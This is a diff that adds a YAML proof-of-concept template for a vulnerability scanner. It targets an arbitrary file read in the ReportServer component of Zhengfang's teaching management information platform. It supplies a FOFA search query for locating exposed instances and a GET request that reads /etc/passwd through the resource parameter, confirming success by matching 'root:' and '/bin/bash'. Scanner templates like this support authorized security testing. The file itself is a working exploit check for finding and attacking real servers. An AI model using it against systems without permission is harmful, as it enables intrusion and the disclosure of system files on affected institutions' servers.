@@ -1,0 +1,22 @@
+id: poc-yaml-zhengfang-reportserver-arbitrary-file-read
+info:
+  name: 正方教学管理信息服务平台 ReportServer 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 正方教学管理信息服务平台
+  fofa: body="正方软件股份有限公司" && title="教学管理信息服务平台"
+requests:
+- method: GET
+  path: /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin/bash") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
